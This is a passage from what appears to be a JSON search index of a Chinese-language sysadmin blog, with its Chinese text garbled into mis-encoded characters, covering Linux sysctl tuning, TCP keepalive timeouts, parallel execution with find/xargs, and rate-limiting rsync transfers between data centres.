max memory usage\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#net.netfilter.nf_conntrack_max = 131072\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#net.netfilter.nf_conntrack_tcp_loose = 1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#TCPçš„ç›´æ¥æ‹¥å¡é€šå‘Š(tcp_ecn)å…³æ‰\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_ecn\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#è·¯ç”±ç¼“å­˜åˆ·æ–°é¢‘ç‡ï¼Œå½“ä¸€ä¸ªè·¯ç”±å¤±è´¥åå¤šé•¿æ—¶é—´è·³åˆ°å¦ä¸€ä¸ªè·¯ç”±ï¼Œé»˜è®¤æ˜¯300ã€‚\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.route.gc_timeout\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e100\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#è®¾å®šç³»ç»Ÿä¸­æœ€å¤šå…è®¸åœ¨å¤šå°‘TCPå¥—æ¥å­—ä¸è¢«å…³è”åˆ°ä»»ä½•ä¸€ä¸ªç”¨æˆ·æ–‡ä»¶å¥æŸ„ä¸Šã€‚\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#å¦‚æœè¶…è¿‡è¿™ä¸ªæ•°å­—ï¼Œæ²¡æœ‰ä¸ç”¨æˆ·æ–‡ä»¶å¥æŸ„å…³è”çš„TCP å¥—æ¥å­—å°†ç«‹å³è¢«å¤ä½\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#é˜²ç®€å•Dos\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_max_orphans\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e655360\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# NOTE: Enable this if machine support it\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# -- 10gbe tuning from Intel ixgb driver README -- #\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# turn off selective ACK and timestamps\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#net.ipv4.tcp_sack = 0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#net.ipv4.tcp_timestamps = 1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e** æ³¨æ„ï¼Œnet.ipv4.tcp_tw_recycle ä¸è¦æ‰“å¼€ï¼Œåœ¨ NAT ç¯å¢ƒä¸­ä¼šå‡ºé”™ï¼Œè€Œä¸”åœ¨ K8S ä¸­ä¹Ÿä¼šå›  NAT å¯¼è‡´ pod å‡ºé”™ï¼Œåˆ‡è®°ï¼ï¼ï¼**\u003c/p\u003e","title":"Linuxå†…æ ¸sysctlå†…æ ¸å‚æ•°ä¼˜åŒ–"},{"content":"Custom Configuration of TCP Socket Keep-Alive Timeouts è¿™æ˜¯ä¸ªå¤è€çš„è¯é¢˜ï¼Œæˆ‘ä»¬åœ¨æœºå™¨çš„ä¼˜åŒ–ä¸­ï¼Œéœ€è¦è®¾ç½® TCP Socket çš„ Timeout å‚æ•°\nç”¨æ¥åŠ å¿« TCP å…³é—­æ— ç”¨é—²ç½®è¿æ¥çš„æ—¶é—´\nLinux å†…æ ¸ä¸­æœ‰ä¸‰ä¸ªç¼ºçœå‚æ•°:\ntcp_keepalive_time ç¼ºçœæ˜¯ 7200 ç§’ tcp_keepalive_probes ç¼ºçœæ˜¯ 9 tcp_keepalive_intvl ç¼ºçœæ˜¯ 75 ç§’ å¤„ç†æµç¨‹å¦‚ä¸‹ï¼š\nä¸€ã€å®¢æˆ·ç«¯æ‰“å¼€ä¸€ä¸ª TCP socket è¿æ¥ï¼Œå¼€å§‹è·ŸæœåŠ¡å™¨é€šè®¯\näºŒã€å¦‚æœè¿™æ¡ socket è¿æ¥ç©ºé—²æ²¡æœ‰ä»»ä½•æ•°æ®ä¼ è¾“ï¼Œé™é»˜äº† tcp_keepalive_time ç§’åï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯ä¼šä¸»åŠ¨å‘é€ä¸€ä¸ªç©ºçš„ ACK åŒ…åˆ°æœåŠ¡å™¨\nä¸‰ã€é‚£ä¹ˆï¼Œæ ¹æ®æœåŠ¡å™¨æ˜¯å¦å›åº”äº†ä¸€ä¸ªç›¸åº”çš„ ACK åŒ…æ¥åˆ¤æ–­\nACK æœªå›åº” ç­‰å¾… tcp_keepalive_intvl ç§’ï¼Œç„¶åå†å‘ä¸€ä¸ª ACK åŒ… é‡å¤ä»¥ä¸Šç­‰å¾…å¹¶å‘é€ ACK åŒ…çš„è¿‡ç¨‹ï¼Œç›´åˆ°æ¬¡æ•°ç­‰äº tcp_keepalive_probes å¦‚æœç¬¬2æ­¥åšå®Œè¿˜æ”¶ä¸åˆ°ä»»ä½•å›åº”ï¼Œå‘é€ä¸€ä¸ª RST åŒ…å¹¶å…³é—­è¿æ¥ å›åº”äº†: å›åˆ°ä¸Šè¿°ç¬¬äºŒæ­¥ é‚£ä¹ˆç¼ºçœæƒ…å†µä¸‹ï¼Œ7200+75Ã—9ï¼Œä¸€ä¸ªæ²¡æœ‰ä»»ä½•æ•°æ®ä¼ è¾“çš„ socket æ‰ä¼šè¢«å…³é—­ï¼Œå¤§æ¦‚æ˜¯2å°æ—¶11åˆ†é’Ÿã€‚\nè¿™ä¸ªæ—¶é—´å¤ªé•¿äº†ã€‚éœ€è¦ä¼˜åŒ–ä¸€ä¸‹ï¼š\nnet.ipv4.tcp_keepalive_time = 300 net.ipv4.tcp_keepalive_probes = 5 net.ipv4.tcp_keepalive_intvl = 15 ä¸Šé¢çš„æ—¶é—´æ˜¯ 300 + 5x15ï¼Œå¤§æ¦‚æ˜¯6åˆ†é’Ÿï¼Œå¤§å¤§ç¼©çŸ­é‡Šæ”¾ç©ºé—² socket çš„æ—¶é—´\n","permalink":"https://rendoumi.com/posts/20211102-tcp_keealive/","summary":"\u003ch4 id=\"custom-configuration-of-tcp-socket-keep-alive-timeouts\"\u003eCustom Configuration of TCP Socket Keep-Alive Timeouts\u003c/h4\u003e\n\u003cp\u003eè¿™æ˜¯ä¸ªå¤è€çš„è¯é¢˜ï¼Œæˆ‘ä»¬åœ¨æœºå™¨çš„ä¼˜åŒ–ä¸­ï¼Œéœ€è¦è®¾ç½® TCP Socket çš„ Timeout å‚æ•°\u003c/p\u003e\n\u003cp\u003eç”¨æ¥åŠ å¿« TCP å…³é—­æ— ç”¨é—²ç½®è¿æ¥çš„æ—¶é—´\u003c/p\u003e\n\u003cp\u003eLinux å†…æ ¸ä¸­æœ‰ä¸‰ä¸ªç¼ºçœå‚æ•°:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-plaintext\" data-lang=\"plaintext\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  tcp_keepalive_time\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eç¼ºçœæ˜¯ 7200 ç§’\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-plaintext\" data-lang=\"plaintext\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  tcp_keepalive_probes\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eç¼ºçœæ˜¯ 9\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-plaintext\" data-lang=\"plaintext\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  tcp_keepalive_intvl\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eç¼ºçœæ˜¯ 75 ç§’\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eå¤„ç†æµç¨‹å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eä¸€ã€å®¢æˆ·ç«¯æ‰“å¼€ä¸€ä¸ª TCP socket è¿æ¥ï¼Œå¼€å§‹è·ŸæœåŠ¡å™¨é€šè®¯\u003c/p\u003e\n\u003cp\u003eäºŒã€å¦‚æœè¿™æ¡ socket è¿æ¥ç©ºé—²æ²¡æœ‰ä»»ä½•æ•°æ®ä¼ è¾“ï¼Œé™é»˜äº† \u003ccode\u003etcp_keepalive_time\u003c/code\u003e ç§’åï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯ä¼šä¸»åŠ¨å‘é€ä¸€ä¸ªç©ºçš„ \u003ccode\u003eACK\u003c/code\u003e åŒ…åˆ°æœåŠ¡å™¨\u003c/p\u003e\n\u003cp\u003eä¸‰ã€é‚£ä¹ˆï¼Œæ ¹æ®æœåŠ¡å™¨æ˜¯å¦å›åº”äº†ä¸€ä¸ªç›¸åº”çš„ ACK åŒ…æ¥åˆ¤æ–­\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-plaintext\" data-lang=\"plaintext\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eACK    \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eæœªå›åº”\n\u003col\u003e\n\u003cli\u003eç­‰å¾… \u003ccode\u003etcp_keepalive_intvl\u003c/code\u003e ç§’ï¼Œç„¶åå†å‘ä¸€ä¸ª \u003ccode\u003eACK\u003c/code\u003e åŒ…\u003c/li\u003e\n\u003cli\u003eé‡å¤ä»¥ä¸Šç­‰å¾…å¹¶å‘é€ ACK åŒ…çš„è¿‡ç¨‹ï¼Œç›´åˆ°æ¬¡æ•°ç­‰äº \u003ccode\u003etcp_keepalive_probes\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eå¦‚æœç¬¬2æ­¥åšå®Œè¿˜æ”¶ä¸åˆ°ä»»ä½•å›åº”ï¼Œå‘é€ä¸€ä¸ª \u003ccode\u003eRST\u003c/code\u003e åŒ…å¹¶å…³é—­è¿æ¥\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eå›åº”äº†\u003c/strong\u003e: å›åˆ°ä¸Šè¿°ç¬¬äºŒæ­¥\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eé‚£ä¹ˆç¼ºçœæƒ…å†µä¸‹ï¼Œ7200+75Ã—9ï¼Œä¸€ä¸ªæ²¡æœ‰ä»»ä½•æ•°æ®ä¼ è¾“çš„ socket æ‰ä¼šè¢«å…³é—­ï¼Œå¤§æ¦‚æ˜¯2å°æ—¶11åˆ†é’Ÿã€‚\u003c/p\u003e","title":"Linuxå†…æ ¸TCPè¿æ¥Keep-Alive timeoutçš„é…ç½®"},{"content":"è¿™å±äºShellçš„é«˜çº§æŠ€å·§äº†ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦åœ¨ bash ä¸­å¹¶å‘ wget rsync æ–‡ä»¶ï¼Œä¸‹é¢å°±è®¨è®ºä¸€ä¸‹è¿™ä¸ªé—®é¢˜ã€‚\né¦–å…ˆä»ç®€å•çš„å•çº¿ç¨‹å¼€å§‹ï¼š\n$ for i in $(seq 1 2); do echo $i; done 1 2 å¯ä»¥çœ‹åˆ°æ˜¯é¡ºåºæ‰§è¡Œçš„ï¼Œä¸‹é¢å˜å¤šçº¿ç¨‹ï¼š\n$ for i in $(seq 1 2); do echo $i \u0026amp; done [1] 245505 1 [2] 245506 2 [1] Done echo $i [2] Done echo $i å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åªæŠŠ ; å·æ”¹æˆäº† \u0026amp; å·ï¼Œç¨‹åºå°±å˜æˆäº†å¤šçº¿ç¨‹æ‰§è¡Œã€‚\nåŒºåˆ«åœ¨äº ; å·ä¼šç­‰å¾…ä¹‹å‰çš„å‘½ä»¤æ‰§è¡Œå®Œæ¯•å†æ‰§è¡Œä¸‹ä¸€æ¡ï¼Œè€Œ \u0026amp; ä¸ç­‰å¾…ï¼Œç›´æ¥ç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡ï¼›ç›¸å½“äºåå°è¿è¡Œäº†å‰ä¸€æ¡å‘½ä»¤ã€‚\nä¸‹é¢è¯´è¯´ find çš„å•çº¿ç¨‹å’Œå¤šçº¿ç¨‹ï¼š\nfind çš„ exec ç”¨æ³•\n$ find /path [args] -exec [cmd] {} \\; {} å ä½ç¬¦å·ï¼Œå­˜æ”¾findæ‰¾åˆ°çš„è®°å½• ; å¯¹äºæ¯ä¸€æ¡æ‰¾åˆ°çš„å•ç‹¬è®°å½•ï¼Œæ‰§è¡Œçš„cmdæ˜¯ä¸€æ¡ä¸€æ¡å•ç‹¬æ‰§è¡Œçš„ æ‰§è¡Œçš„é¡ºåºå¦‚ä¸‹: cmd result1; cmd result2; \u0026hellip;; cmd result N $ find /path [args] -exec [cmd] {} \\+ {} å ä½ç¬¦å·ï¼Œå­˜æ”¾findæ‰¾åˆ°çš„è®°å½• + å¯¹äºæ‰¾åˆ°çš„æ‰€æœ‰è®°å½•ï¼Œæ‰§è¡Œçš„cmdæ˜¯åˆå¹¶äº†æ‰€æœ‰è®°å½•é›†æ‰§è¡Œçš„ æ‰§è¡Œé¡ºåºå¦‚ä¸‹: cmd result1 result2 \u0026hellip; result N å¤šä¸ªexecå¯ä»¥ä¸²èµ·æ¥ï¼š\n$ find /tmp/dir1/ -type f -exec grep howtouselinux {} \\; -exec echo {} \\; | sed \u0026#39;s/howtouselinux/deep/g\u0026#39; è‡³æ­¤ï¼Œfind ä¹Ÿè¿˜æ˜¯å•çº¿ç¨‹æ‰§è¡Œçš„ï¼Œå¹¶æ²¡æœ‰å¹¶å‘ã€‚\nfind è¦å¹¶å‘ï¼Œå°±åªèƒ½è·Ÿ xargs ç»“åˆåœ¨ä¸€èµ·ï¼š\nxargs é€šå¸¸é…åˆç®¡é“ä½¿ç”¨ï¼Œå°†å‰é¢å‘½ä»¤äº§ç”Ÿçš„å‚æ•°ï¼Œé€ä¸ªä¼ å…¥åç»­å‘½ä»¤ï¼Œä½œä¸ºå‚æ•°ã€‚xargs ä¼ æ¥çš„å‚æ•°ï¼Œé»˜è®¤ä½äº xargs åé¢å‘½ä»¤çš„æœ€åï¼Œå¦‚æœè¦æ”¹å˜ä½ç½®ï¼Œéœ€è¦ç”¨**-I**å‚æ•°ã€‚xargs å¦‚æœä¸å¸¦å‘½ä»¤ï¼Œç¼ºçœæ˜¯ echo\n-d åˆ†éš”ç¬¦\n$ echo -e \u0026#34;a\\tb\\tc\u0026#34; | xargs -d \u0026#34;\\t\u0026#34; echo a b c -I{} æŒ‡å®šå ä½ç¬¦ï¼Œ-I %é‚£å°±æ˜¯ % æ›¿ä»£ä»ä¹‹å‰ç®¡é“å–å¾—çš„å‚æ•°\n$ find . -type d | xargs -I % -0 rsync -auvPR % 192.168.1.38::new/ -0 è·Ÿfindçš„-print0é…åˆï¼Œfindå‘½ä»¤æœ‰ä¸€ä¸ªç‰¹åˆ«çš„å‚æ•°-print0ï¼ŒæŒ‡å®šè¾“å‡ºçš„æ–‡ä»¶åˆ—è¡¨ä»¥nullåˆ†éš”ã€‚ç„¶åï¼Œxargså‘½ä»¤çš„-0å‚æ•°è¡¨ç¤ºç”¨nullå½“ä½œåˆ†éš”ç¬¦ã€‚\n$ find ./new -mindepth 6 -maxdepth 6 -type d -print0 | xargs -I % -0 rsync -auvPR % 172.18.34.38::new/ -P æœ€å¤§å¹¶å‘çº¿ç¨‹æ•°ï¼Œä¸‹é¢æ˜¯å¹¶å‘30çº¿ç¨‹\n$ find ./new -mindepth 6 -maxdepth 6 -type d -print0 | xargs -P 30 -I % -0 rsync -auvPR % 172.18.34.38::new/ -n é€‰é¡¹é™åˆ¶å•ä¸ªå‘½ä»¤è¡Œçš„å‚æ•°ä¸ªæ•°ï¼Œä¸‹é¢æ˜¯ rsync ä¸€è¡Œå‘½ä»¤ä¼ å¸¦60ä¸ªæ–‡ä»¶ï¼Œ30ä¸ªè¿›ç¨‹é‚£å°±æ˜¯30ä¸ª rsyncï¼Œæ¯ä¸ª rsync åŒæ—¶ä¼ 60ä¸ªæ–‡ä»¶ã€‚\n$ find ./new -mindepth 6 -maxdepth 6 -type d -print0 | xargs -P 30 -n 60 -I % -0 rsync -auvPR % 172.18.34.38::new/ $ echo {0..10} | xargs -I{} -n 2 0 1 2 3 4 5 6 7 8 9 10 ä½¿ç”¨ bash -c å¹¶å‘çš„ä¾‹å­ï¼š\n$ time for i in $(seq 1 5); do echo $[$RANDOM % 5 + 1]; done | xargs -I{} echo \u0026#34;sleep {}; echo \u0026#39;Done! {}\u0026#39;\u0026#34; | xargs -P5 -I{} bash -c \u0026#34;{}\u0026#34; ","permalink":"https://rendoumi.com/posts/20211029-bash_multithread/","summary":"\u003cp\u003eè¿™å±äºShellçš„é«˜çº§æŠ€å·§äº†ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦åœ¨ bash ä¸­å¹¶å‘ wget rsync æ–‡ä»¶ï¼Œä¸‹é¢å°±è®¨è®ºä¸€ä¸‹è¿™ä¸ªé—®é¢˜ã€‚\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆä»ç®€å•çš„å•çº¿ç¨‹å¼€å§‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ \u003cspan class=\"k\"\u003efor\u003c/span\u003e i in \u003cspan class=\"k\"\u003e$(\u003c/span\u003eseq \u003cspan class=\"m\"\u003e1\u003c/span\u003e 2\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¯ä»¥çœ‹åˆ°æ˜¯é¡ºåºæ‰§è¡Œçš„ï¼Œä¸‹é¢å˜å¤šçº¿ç¨‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ \u003cspan class=\"k\"\u003efor\u003c/span\u003e i in \u003cspan class=\"k\"\u003e$(\u003c/span\u003eseq \u003cspan class=\"m\"\u003e1\u003c/span\u003e 2\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"nv\"\u003e$i\u003c/span\u003e \u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e \u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e1\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"m\"\u003e245505\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e2\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"m\"\u003e245506\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e1\u003cspan class=\"o\"\u003e]\u003c/span\u003e   Done                    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e2\u003cspan class=\"o\"\u003e]\u003c/span\u003e   Done                    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¯ä»¥çœ‹åˆ°æˆ‘ä»¬åªæŠŠ ; å·æ”¹æˆäº† \u0026amp; å·ï¼Œç¨‹åºå°±å˜æˆäº†å¤šçº¿ç¨‹æ‰§è¡Œã€‚\u003c/p\u003e\n\u003cp\u003eåŒºåˆ«åœ¨äº ; å·ä¼šç­‰å¾…ä¹‹å‰çš„å‘½ä»¤æ‰§è¡Œå®Œæ¯•å†æ‰§è¡Œä¸‹ä¸€æ¡ï¼Œè€Œ \u0026amp; ä¸ç­‰å¾…ï¼Œç›´æ¥ç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡ï¼›ç›¸å½“äºåå°è¿è¡Œäº†å‰ä¸€æ¡å‘½ä»¤ã€‚\u003c/p\u003e\n\u003cp\u003eä¸‹é¢è¯´è¯´ find çš„å•çº¿ç¨‹å’Œå¤šçº¿ç¨‹ï¼š\u003c/p\u003e\n\u003cp\u003efind çš„ exec ç”¨æ³•\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ find /path \u003cspan class=\"o\"\u003e[\u003c/span\u003eargs\u003cspan class=\"o\"\u003e]\u003c/span\u003e -exec \u003cspan class=\"o\"\u003e[\u003c/span\u003ecmd\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e{}\u003c/span\u003e \u003cspan class=\"se\"\u003e\\;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e{} å ä½ç¬¦å·ï¼Œå­˜æ”¾findæ‰¾åˆ°çš„è®°å½•\u003c/li\u003e\n\u003cli\u003e; å¯¹äºæ¯ä¸€æ¡æ‰¾åˆ°çš„å•ç‹¬è®°å½•ï¼Œæ‰§è¡Œçš„cmdæ˜¯ä¸€æ¡ä¸€æ¡å•ç‹¬æ‰§è¡Œçš„\u003c/li\u003e\n\u003cli\u003eæ‰§è¡Œçš„é¡ºåºå¦‚ä¸‹: cmd result1; cmd result2; \u0026hellip;; cmd result N\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ find /path \u003cspan class=\"o\"\u003e[\u003c/span\u003eargs\u003cspan class=\"o\"\u003e]\u003c/span\u003e -exec \u003cspan class=\"o\"\u003e[\u003c/span\u003ecmd\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e{}\u003c/span\u003e \u003cspan class=\"se\"\u003e\\+\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e{} å ä½ç¬¦å·ï¼Œå­˜æ”¾findæ‰¾åˆ°çš„è®°å½•\u003c/li\u003e\n\u003cli\u003e+  å¯¹äºæ‰¾åˆ°çš„æ‰€æœ‰è®°å½•ï¼Œæ‰§è¡Œçš„cmdæ˜¯åˆå¹¶äº†æ‰€æœ‰è®°å½•é›†æ‰§è¡Œçš„\u003c/li\u003e\n\u003cli\u003eæ‰§è¡Œé¡ºåºå¦‚ä¸‹: cmd result1 result2 \u0026hellip; result N\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eå¤šä¸ªexecå¯ä»¥ä¸²èµ·æ¥ï¼š\u003c/p\u003e","title":"shellä»¥åŠfindçš„å¤šçº¿ç¨‹æ‰§è¡Œ"},{"content":"ä¹‹å‰è®²è¿‡å¦‚ä½•å¯¹ opnvpn æ€»ä½“é™é€Ÿï¼Œè¿™æ¬¡æ¥äº†ä¸€ä¸ªæ›´ä¸¥æ ¼çš„ç¨‹åºé™é€Ÿéœ€æ±‚ï¼š\nåœºæ™¯å¦‚ä¸‹ï¼š\nä¸¤ä¸ªæœºæˆ¿é—´æœ‰ä¸€æ¡ä¸“çº¿ 100M\nä¸¤ä¸ªæœºæˆ¿é—´éœ€è¦åŒæ­¥æ•°æ®ï¼ŒåŒæ­¥éœ€è¦é™åˆ¶åˆ°60Mï¼Œç»™åˆ«çš„ç¨‹åºç•™å‡ºå¸¦å®½ç©ºé—´\nä¼ è¾“æ˜¯å¤šä¸ªæ–‡ä»¶ï¼Œç”¨ rsync å¹¶å‘ä¼ é€\nåˆ†æäº†ä¸€ä¸‹è„šæœ¬çš„æ ¸å¿ƒéƒ¨åˆ†\nfind . -type f | grep $(date -d\u0026#34;-1 day\u0026#34; +\u0026#39;%Y%m%d\u0026#39;) |xargs -I % -P 30 rsync -auvPR % 192.168.9.17::mysql å‘ç°æ˜¯åˆ©ç”¨ xargs çš„å¹¶å‘ï¼Œ-P 30 æœ€å¤§å¹¶å‘30ä¸ªï¼Œå¯åŠ¨äº† rsync åŒæ­¥\nrsync æ²¡æœ‰é™é€Ÿï¼Œè¿™å°±éº»çƒ¦äº†ã€‚\nä¸€ã€å•æ–‡ä»¶å•ç‹¬é™é€Ÿ é¦–å…ˆæ˜¯ä½¿ç”¨ rsync çš„ \u0026ndash;bwlimit=600 